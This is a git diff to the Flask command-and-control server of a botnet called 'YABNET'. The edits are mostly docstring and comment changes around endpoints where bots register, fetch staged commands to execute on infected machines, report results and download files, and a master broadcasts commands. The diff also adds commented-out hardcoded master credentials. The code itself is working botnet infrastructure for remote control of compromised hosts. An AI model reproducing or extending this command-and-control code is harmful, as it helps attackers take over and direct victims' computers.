@@ -34,6 +34,9 @@ if not os.path.exists(UPLOAD_DIRECTORY):
 MASTERNAME = 'u'
 MASTERPASSWORD = 'p'
 
+# MASTERNAME = 'soju'
+# MASTERPASSWORD = 'letredin'
+
 # TODO: Change the register key to change dynamically 
 # Keys - Hardcoded for now, going to make them random
 FIRSTCONTACTKEY = 'firstcontactkey'
@@ -139,7 +142,7 @@ def heartbeat():
 @app.route('/firstcontact', methods=['POST'])
 def firstcontact(): 
     """
-    Description: Endpoint which retrieves first contact from the bot. 
+    Description: Endpoint which retrieves first contact from the bot. This endpoint acts as a sanity check that the visitor is indeed a YABNET bot. After the sanity check, the server will return a registerkey to the bot.
     
     [POST] 
         - (str) firstcontactkey : firstcontact key to identify if the 
@@ -164,7 +167,7 @@ def firstcontact():
 @app.route('/register', methods=['POST'])
 def register():
     """
-    Description: Register a new bot to the server 
+    Description: Register a new bot to the server. This endpoint officially adds a bot to the server's database. 
 
     [POST] 
         - registerkey = Register key that is needed for the registration process. 
@@ -187,6 +190,7 @@ def register():
     bot_user = data['user']
 
     # API Endpoint logic 
+    # Check bot already exists in the database 
     try:
         query_bot = Bot.query.filter_by(ip=bot_ip).filter_by(user=bot_user).first()
     except Exception as e:
@@ -207,7 +211,7 @@ def register():
 @app.route('/bot/<bot_ip>/push', methods=['POST'])
 def botpush(bot_ip):
     """
-    Description: Pushes the command into the cmd Model. 
+    Description: Pushes the command into the bot and cmd Model. The command pushed into the bot and cmd model will later be used in the /task endpoint. 
 
     [POST]
         - masterkey = Master's secret key 
@@ -252,9 +256,7 @@ def botpush(bot_ip):
 @app.route('/bot/<bot_ip>/task', methods=['POST'])
 def bottask(bot_ip):
     """
-    Description: Shows the command that is staged for the corresponding bot. 
-    The bot will visit this endpoint, retrieve the command, and execute it in the 
-    target machine 
+    Description: Returns the command that is staged for the corresponding bot. The bot will visit this endpoint, retrieve the command, and execute it.
 
     [POST]
         - registerkey = "Authentication" key for the bot  
@@ -295,9 +297,10 @@ def bottask(bot_ip):
 def botresult(bot_ip):
     """
     Description: API endpoint which the bot comes and reports the result of the staged command. 
+    
     If a bot visits, the endpoint will update the result of the Command Model of the corresponding bot. 
 
-    If a master visits, the endpoint will show the result.
+    If a master visits, the endpoint will show the result. 
 
     [POST]
         - key = Either bot_unique_key or masterkey. Endpoint's behavior changes correspondingly 
@@ -400,7 +403,6 @@ def commandlist():
 
     for command in commandlist:
         result += command.get_info() + "\n"
-        #print (command.get_info())
 
     return result 
 
@@ -441,7 +443,8 @@ def broadcast():
 
     return jsonify({ 'result': '[+] Broadcast successful' })
 
-# This is for debugging purposes 
+# Endpoint created for debugging purposes. Ignore it for now. 
+# Shows the files in /opt/yabnet/uploads directory, which is the base upload directory. 
 @app.route('/files')
 def list_files():
     files = [] 
@@ -472,11 +475,11 @@ def download_file(filename):
     """
     Description: File download endpoint for the bots to visit and download specific files
     """
-    error = posterrorcheck(request, 'registerkey')
-    if error is not True:
-        return error     
+    result = posterrorcheck(request, 'registerkey')
+    if result is not True:
+        return result     
 
-    print("[DEBUG] filename = ", filename)
+    print("[DEBUG] Bot downloading filename = ", filename)
     return send_from_directory(app.config['UPLOAD_FOLDER'], filename)
 
 
